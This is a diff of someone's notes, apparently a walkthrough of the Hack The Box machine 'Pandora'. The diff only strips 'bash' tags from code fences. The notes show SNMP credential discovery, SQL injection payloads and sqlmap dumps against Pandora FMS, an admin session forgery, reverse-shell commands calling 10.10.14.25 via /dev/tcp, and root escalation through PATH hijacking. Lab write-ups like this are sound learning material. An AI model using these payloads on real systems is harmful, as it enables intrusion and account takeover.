@@ -1,14 +1,14 @@
 - 10.10.11.136 leads to panda.htb web page
 	- added to /etc/hosts
 - nmap shows port 80 http and port 22 ssh
-	```bash
+	```
 nmap 10.10.11.136
 nmap -sV -sT 10.10.11.136
 ```
 	- Linux OS
 	- Apache Server 2.4.41
 - dirsearch finds assets subdirectory
-	```bash
+	```
 diresearch -u http://panda.htb
 ```
 	- Assets shows a directory list with .svg images
@@ -21,17 +21,17 @@ diresearch -u http://panda.htb
 - many loophles, the assets hold images, one of the images talks of plainadmin website. there are svg vulnerabilities. fuzzing and subdomain search is a bit difficult as pages return true always.
 --------
 - **But the key is to check udp ports for nmap**
-	```bash
+	```
 nmap -sU 10.10.11.136 #slower 
 nmap -sU --min-rate=5000 10.10.11.136 #faster
 ```
 ## SNMP Enumration
 - perform snmpwalk
-	```bash
+	```
 	snmpwalk -v 1 -c public 10.10.11.136
 ```
 	- We find a username and password:
-		```bash
+		```
 iso.3.6.1.2.1.25.4.2.1.5.1101 = STRING: "-u daniel -p HotelBabylon23"
 ```
 	- can ssh into machine as this user **but we cannot access user flag as its for user matt**
@@ -49,11 +49,11 @@ iso.3.6.1.2.1.25.4.2.1.5.1101 = STRING: "-u daniel -p HotelBabylon23"
 - **New technique**
 	- now to get access to this site we need to forward it to our localhost via a port
 	- ssh into daniel again but with -L to set a listener port which will forward this localhost to our machine's localhost ip
-		```bash
+		```
 ssh -L 9090:127.0.0.1:80 daniel@panda.htb
 ```
 		- to check pass this command on your local machine to check if ssh is listening
-			```bash
+			```
 ss -lntp | grep "9090"
 ```
 	- add pandora.panda.htb to localhost in /etc/hosts
@@ -70,13 +70,13 @@ ss -lntp | grep "9090"
 		- https://www.exploit-db.com/exploits/50961
 - need to capture session id to use for sqlmap
 	- since we know we attack the session id of chat_generator.php
-		```bash
+		```
 http://pandora.panda.htb:9090/pandora_console/include/chart_generator.php?session_id=' show datases or 1=1-- -
 ```
 	- we get sql error showing its vulnerable to SQLi
 ## SQLMAP enumeration
 - enumerate with sqli 
-	```bash
+	```
 sqlmap -u "http://pandora.panda.htb:9090/pandora_console/include/chart_generator.php?session_id=*" --batch --level=5 --risk=3 -D pandora -T tsessions_php --dump
 ```
 	- FIRST PASSWD --dbs, found a database, then --tables to find tables then --dump a table step by step
@@ -91,7 +91,7 @@ sqlmap -u "http://pandora.panda.htb:9090/pandora_console/include/chart_generator
 		- somethign similar for matt
 		- the s value represents the characters (daniel is 6 characters)
 		- add this to url :
-			```bash
+			```
 http://pandora.panda.htb:9090/pandora_console/include/chart_generator.php?sessionid=' union select 1,2,'id_usuario|s:5:"admin";'-- -
 ```
 	- we get no error message and refreshion pandora.panda.htb:9090 we get admin access
@@ -113,7 +113,7 @@ http://pandora.panda.htb:9090/pandora_console/images/shell.php?cmd=whoami
 				- open burpsuite and capture this
 					- change request type to post
 					- pass this command at the bottom (a blank line in between the request and this)
-					```bash
+					```
 cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.25/9998 0>&1'
 ```
 					- Select everything from after "cmd=" and press Ctrl+U to url encode and then send the packet while listening on port 9998.
@@ -125,12 +125,12 @@ cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.25/9998 0>&1'
 	- we find an ajax.php file
 		- https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities
 			- can execute exploit in this post request
-				```bash
+				```
 page=include/ajax/events&perform_event_response=10000000
 &**target=bash -c 'bash -i >& /dev/tcp/10.10.14.25/9998 0>&1'&response_id=1
 ```
 		- we also need to url encode it (Ctrl+U in Burp Suite)
-			```bash
+			```
 page=include/ajax/events&perform_event_response=10000000
 &target=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.25/9997+0>%261'&response_id=1
 ```
@@ -138,25 +138,25 @@ page=include/ajax/events&perform_event_response=10000000
 			- to gain access at matt user
 ## Privilege escalation
 - on enumerating we do 
-	```bash
+	```
 find / -type f -perm -4000 2>/dev/null
 ```
 	- and we find pandora_backup with root priv
 		- yet we cant execute it
 		- this is due to a restricted shell
 			- why? we tried sudo -l and it gave a weird error:
-				```bash
+				```
 sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
 sudo: unable to initialize policy plugin
 ```
 			- 
 			- https://gtfobins.github.io/gtfobins/at/#shell
 				- can use at to break of of restricted shell
-				```bash
+				```
 # tried but didnt work
 ```
 		- alternatively, create a ssh key in your local machine and send it to target "
-			```bash
+			```
 python -m http.server:8001 # where you have the key
 in target matchine /home/matt.ssh: wget 10.10.14.25:8001/matt.pub #get public key to .ssh directory
 mv matt.pub authorized_keys
@@ -166,7 +166,7 @@ ssh -i matt matt@10.10.11.136 # should not get password prompt
 ```
 		- then in shell create tar file and make it executable with /bin/bash as entry(why? if you look at pandora_backup which we want to execute, that is the command which gets use root)
 		- create path to current directory
-			```bash
+			```
 echo /bin/bin > tar
 chmod +x tar
 export PATH=$(pwd):$PATH
@@ -177,14 +177,14 @@ echo $PATH # should show current direvtory first now
 -------
 ## The Priv Esc exploit in pandora_backup
 - on doing strings or Ghidra we can find the main code of pandora_backup
-	```bash
+	```
 PandoraFMS Backup Utility
 Now attempting to backup PandoraFMS client
 tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
 ```
 	- we create atar file with the command /bin/bash into it and make it executable. 
 	- Furthermore we check the $PATH as thats what the command path checks when executing. We change this to our current directory 
-		```bash
+		```
 export PATH=$(pwd):$PATH
 echo $PATH
 ```
